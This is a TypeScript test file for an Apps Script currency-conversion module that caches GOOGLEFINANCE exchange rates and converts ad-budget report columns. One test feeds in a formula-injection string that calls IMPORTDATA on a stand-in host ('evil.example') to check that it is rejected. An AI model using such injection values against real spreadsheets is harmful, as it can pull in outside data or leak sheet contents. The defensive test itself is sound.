/**
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import {describe, expect, it} from 'vitest';
import {
  FX_MAX_RETRIES,
  FX_SCRATCH_CELL,
  applyCurrencyConversionToRow,
  resolveDailyFxRates,
} from '../src/appscript/fx-rates';
import {getRunStateValue, setRunStateValue} from '../src/appscript/run-state';
import {createEmptyReportRow} from '../src/shared/schema';
import {createMockSpreadsheetApp, installAppsScriptGlobals} from './mocks/google-apps-script.mock';

describe('Daily-Locked GOOGLEFINANCE FX Resolver & Monetary Conversion', () => {
  it('resolves GOOGLEFINANCE rates once per day, caches in _RunState, and falls back on #N/A', () => {
    const spreadsheetApp = createMockSpreadsheetApp();
    installAppsScriptGlobals({ spreadsheetApp });
    const ss = spreadsheetApp.getActiveSpreadsheet();
    const runStateSheet = ss.insertSheet('_RunState', 200);

    let formulaCalls = 0;
    runStateSheet.formulaEvaluator = (formula: string) => {
      formulaCalls++;
      if (formula.includes('EURUSD')) return 1.1;
      if (formula.includes('GBPUSD')) return '#N/A';
      return 1.0;
    };
    // GBP's live rate is #N/A, so it falls back to the last known good rate
    setRunStateValue(ss, 'FX_LAST_GOOD_GBP_USD', '1.28', '', '2026-10-13');

    const rates = resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['USD', 'EUR', 'GBP'],
      targetCurrency: 'USD',
    });

    expect(rates).toEqual({
      USD: 1,
      EUR: 1.1,
      GBP: 1.28,
    });

    const callsAfterFirstResolve = formulaCalls;
    // Subsequent hourly runs on the same day must read cached rates from _RunState without re-evaluating GOOGLEFINANCE
    const cachedRates = resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['USD', 'EUR', 'GBP'],
      targetCurrency: 'USD',
    });
    expect(cachedRates).toEqual({ USD: 1, EUR: 1.1, GBP: 1.28 });
    expect(formulaCalls).toBe(callsAfterFirstResolve);
  });

  it('never builds a GOOGLEFINANCE formula from a value that is not a 3-letter currency code', () => {
    const spreadsheetApp = createMockSpreadsheetApp();
    installAppsScriptGlobals({ spreadsheetApp });
    const ss = spreadsheetApp.getActiveSpreadsheet();
    const runStateSheet = ss.insertSheet('_RunState', 200);
    const formulas: string[] = [];
    runStateSheet.formulaEvaluator = (formula: string) => {
      formulas.push(formula);
      return 1.1;
    };

    // An injected target keeps native values and evaluates nothing
    const injected = 'USD")&IMPORTDATA("https://evil.example")&("';
    expect(
      resolveDailyFxRates({ spreadsheet: ss, dateStr: '2026-10-14', sourceCurrencies: ['EUR'], targetCurrency: injected })
    ).toEqual({ EUR: 1 });
    expect(formulas).toEqual([]);

    // Invalid source codes are dropped; only the valid pair is evaluated
    const rates = resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['EUR', 'EU")&X("'],
      targetCurrency: 'usd',
    });
    expect(rates).toEqual({ EUR: 1.1 });
    expect(formulas).toEqual(['=GOOGLEFINANCE("CURRENCY:EURUSD")']);
  });

  it('preserves original account currency in non-*Global columns and converts *Global columns to Target Currency', () => {
    const row = createEmptyReportRow();
    row.currencyCode = 'EUR';
    row.currencyCodeGlobal = 'EUR';
    row.campaign30DaysCost = 100;
    row.campaign30DaysConversionsValue = 400;
    row.campaign30DaysConversions = 10;
    row.campaign30DaysRoas = 4.0;
    row.campaign30DaysCpa = 10;
    row.campaign30DaysSearchBudgetLostImpressionShare = 0.25;
    row.recommendationCurrentBudgetAmount = 50;
    row.recommendationNewBudgetAmount = 80;
    row.recommendationBaseConversionsValue = 200;
    row.recommendationPotentialConversionsValue = 300;
    row.weeklyCostIncrease = 210;
    row.moveBudgetAmount = 250;
    row.moveBudgetSourceTargetCpa = 12;
    row.moveBudgetSourceTargetRoas = 3.5;

    const converted = applyCurrencyConversionToRow(row, 'USD', { EUR: 1.1, USD: 1 });

    expect(converted.currencyCode).toBe('EUR');
    expect(converted.currencyCodeGlobal).toBe('USD');

    // Non-*Global columns remain in original account currency (EUR)
    expect(converted.campaign30DaysCost).toBe(100);
    expect(converted.campaign30DaysConversionsValue).toBe(400);
    expect(converted.campaign30DaysCpa).toBe(10);
    expect(converted.recommendationCurrentBudgetAmount).toBe(50);
    expect(converted.recommendationNewBudgetAmount).toBe(80);
    expect(converted.recommendationBaseConversionsValue).toBe(200);
    expect(converted.recommendationPotentialConversionsValue).toBe(300);
    expect(converted.weeklyCostIncrease).toBe(210);
    expect(converted.moveBudgetAmount).toBe(250);
    expect(converted.moveBudgetSourceTargetCpa).toBe(12);

    // *Global columns are converted into Target Currency (USD)
    expect(converted.recommendationCurrentBudgetAmountGlobal).toBeCloseTo(55);
    expect(converted.recommendationNewBudgetAmountGlobal).toBeCloseTo(88);
    expect(converted.recommendationBaseConversionsValueGlobal).toBeCloseTo(220);
    expect(converted.recommendationPotentialConversionsValueGlobal).toBeCloseTo(330);
    expect(converted.weeklyCostIncreaseGlobal).toBeCloseTo(231);
    expect(converted.moveBudgetAmountGlobal).toBe(275);

    // Verify 2-decimal rounding prevents 1-cent multi-MCC sum drift (e.g. 3150 * 0.83997)
    const precisionRow = createEmptyReportRow();
    precisionRow.currencyCode = 'EUR';
    precisionRow.weeklyCostIncrease = 3150;
    const rounded = applyCurrencyConversionToRow(precisionRow, 'GBP', { EUR: 0.83997 });
    expect(rounded.weeklyCostIncreaseGlobal).toBe(2645.91);

    // moveBudgetAmountGlobal: 250 USD -> GBP is rounded to 2 decimals, native stays put
    const moveRow = createEmptyReportRow();
    moveRow.currencyCode = 'USD';
    moveRow.recommendationType = 'MOVE_UNUSED_BUDGET';
    moveRow.moveBudgetAmount = 250;
    const movedToGbp = applyCurrencyConversionToRow(moveRow, 'GBP', { USD: 0.74756 });
    expect(movedToGbp.moveBudgetAmountGlobal).toBe(186.89);
    expect(movedToGbp.moveBudgetAmount).toBe(250);
    expect(movedToGbp.currencyCodeGlobal).toBe('GBP');

    // targetCurrency NONE keeps moveBudgetAmountGlobal equal to the native moveBudgetAmount
    const unconverted = applyCurrencyConversionToRow(moveRow, 'NONE', { USD: 0.74756 });
    expect(unconverted.moveBudgetAmountGlobal).toBe(250);
    expect(unconverted.moveBudgetAmountGlobal).toBe(unconverted.moveBudgetAmount);

    // Non-MOVE_UNUSED_BUDGET rows have a blank (null) moveBudgetAmount, so the Global value stays null
    const nonMoveRow = createEmptyReportRow();
    nonMoveRow.currencyCode = 'USD';
    expect(nonMoveRow.moveBudgetAmount).toBeNull();
    expect(applyCurrencyConversionToRow(nonMoveRow, 'GBP', { USD: 0.74756 }).moveBudgetAmountGlobal).toBeNull();
    expect(applyCurrencyConversionToRow(nonMoveRow, 'NONE', {}).moveBudgetAmountGlobal).toBeNull();

    // Ratios and counts remain untouched
    expect(converted.campaign30DaysConversions).toBe(10);
    expect(converted.campaign30DaysRoas).toBe(4.0);
    expect(converted.campaign30DaysSearchBudgetLostImpressionShare).toBe(0.25);
    expect(converted.moveBudgetSourceTargetRoas).toBe(3.5);
  });

  it('never poisons FX_LAST_GOOD and returns null (never 1.0) on total FX failure', () => {
    const spreadsheetApp = createMockSpreadsheetApp();
    installAppsScriptGlobals({ spreadsheetApp });
    const ss = spreadsheetApp.getActiveSpreadsheet();
    const runStateSheet = ss.insertSheet('_RunState', 200);

    let formulaCalls = 0;
    runStateSheet.formulaEvaluator = () => {
      formulaCalls++;
      return '#N/A';
    };

    const rates = resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['JPY'],
      targetCurrency: 'USD',
    });

    // JPY fails all retries and has no FX_LAST_GOOD -> null (not 1.0!)
    expect(rates).toEqual({
      JPY: null,
    });

    // GOOGLEFINANCE was set once for JPY (then polled up to FX_MAX_RETRIES times)
    expect(formulaCalls).toBe(1);
    // FX_LAST_GOOD is never poisoned with fallback values
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_EUR_USD')).toBeNull();
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_JPY_USD')).toBeNull();
    // Scratch cell G1 is cleared after evaluation
    expect(runStateSheet.getRange(FX_SCRATCH_CELL).getValue()).toBe('');

    const jpyRow = createEmptyReportRow();
    jpyRow.currencyCode = 'JPY';
    jpyRow.recommendationCurrentBudgetAmount = 100_000;
    jpyRow.recommendationNewBudgetAmount = 150_000;
    jpyRow.recommendationBaseConversionsValue = 500_000;
    jpyRow.recommendationPotentialConversionsValue = 750_000;
    jpyRow.weeklyCostIncrease = 350_000;
    jpyRow.moveBudgetAmount = 25_000;

    const convertedJpy = applyCurrencyConversionToRow(jpyRow, 'USD', rates);
    expect(convertedJpy.currencyCode).toBe('JPY');
    expect(convertedJpy.currencyCodeGlobal).toBe('USD');
    // Native JPY columns stay intact
    expect(convertedJpy.recommendationCurrentBudgetAmount).toBe(100_000);
    // *Global columns become null instead of falsely treating 150,000 JPY as 150,000 USD!
    expect(convertedJpy.recommendationCurrentBudgetAmountGlobal).toBeNull();
    expect(convertedJpy.recommendationNewBudgetAmountGlobal).toBeNull();
    expect(convertedJpy.recommendationBaseConversionsValueGlobal).toBeNull();
    expect(convertedJpy.recommendationPotentialConversionsValueGlobal).toBeNull();
    expect(convertedJpy.weeklyCostIncreaseGlobal).toBeNull();
    expect(convertedJpy.moveBudgetAmountGlobal).toBeNull();
    expect(convertedJpy.moveBudgetAmount).toBe(25_000);
  });
});

describe('GOOGLEFINANCE polling and batched _RunState writes', () => {
  function setup() {
    const spreadsheetApp = createMockSpreadsheetApp();
    installAppsScriptGlobals({spreadsheetApp});
    const ss = spreadsheetApp.getActiveSpreadsheet();
    const runStateSheet = ss.insertSheet('_RunState', 200);
    return {ss, runStateSheet};
  }

  it('sets each GOOGLEFINANCE formula once and polls until "Loading..." resolves', () => {
    const {ss, runStateSheet} = setup();
    let formulaSets = 0;
    let reads = 0;
    runStateSheet.formulaEvaluator = () => {
      formulaSets++;
      return 'Loading...';
    };
    // Simulates the in-flight evaluation finishing on the 2nd read
    runStateSheet.formulaReadEvaluator = (formula, readIndex) => {
      reads++;
      if (!formula.includes('EURUSD')) return '#N/A';
      return readIndex >= 2 ? 1.1 : 'Loading...';
    };

    const rates = resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['EUR', 'JPY'],
      targetCurrency: 'USD',
    });
    expect(rates).toEqual({EUR: 1.1, JPY: null});
    // One formula write per currency pair; EUR resolved on read 2, JPY used all FX_MAX_RETRIES reads
    expect(formulaSets).toBe(2);
    expect(reads).toBe(2 + FX_MAX_RETRIES);
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_EUR_USD')).toBe('1.1');
    expect(runStateSheet.getRange(FX_SCRATCH_CELL).getValue()).toBe('');
  });

  it('caches resolved currencies in _RunState and performs zero sheet writes when cached', () => {
    const {ss, runStateSheet} = setup();
    let formulaEvaluations = 0;
    runStateSheet.formulaEvaluator = (formula: string) => {
      formulaEvaluations++;
      if (formula.includes('EURUSD')) return 1.1;
      if (formula.includes('GBPUSD')) return 1.27;
      if (formula.includes('CHFUSD')) return 1.13;
      return '#N/A';
    };

    resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['EUR', 'GBP', 'CHF', 'USD'],
      targetCurrency: 'USD',
    });
    expect(formulaEvaluations).toBe(3);
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_EUR_USD')).toBe('1.1');
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_GBP_USD')).toBe('1.27');
    expect(getRunStateValue(ss, 'FX_LAST_GOOD_CHF_USD')).toBe('1.13');
    expect(getRunStateValue(ss, 'FX_RATES_2026-10-14_USD')).toBe(
      JSON.stringify({EUR: 1.1, GBP: 1.27, CHF: 1.13, USD: 1})
    );

    const writesAfterFirst = runStateSheet.valueWriteCount;
    resolveDailyFxRates({
      spreadsheet: ss,
      dateStr: '2026-10-14',
      sourceCurrencies: ['EUR', 'GBP', 'CHF', 'USD'],
      targetCurrency: 'USD',
    });
    expect(runStateSheet.valueWriteCount).toBe(writesAfterFirst);
    expect(formulaEvaluations).toBe(3);
  });
});
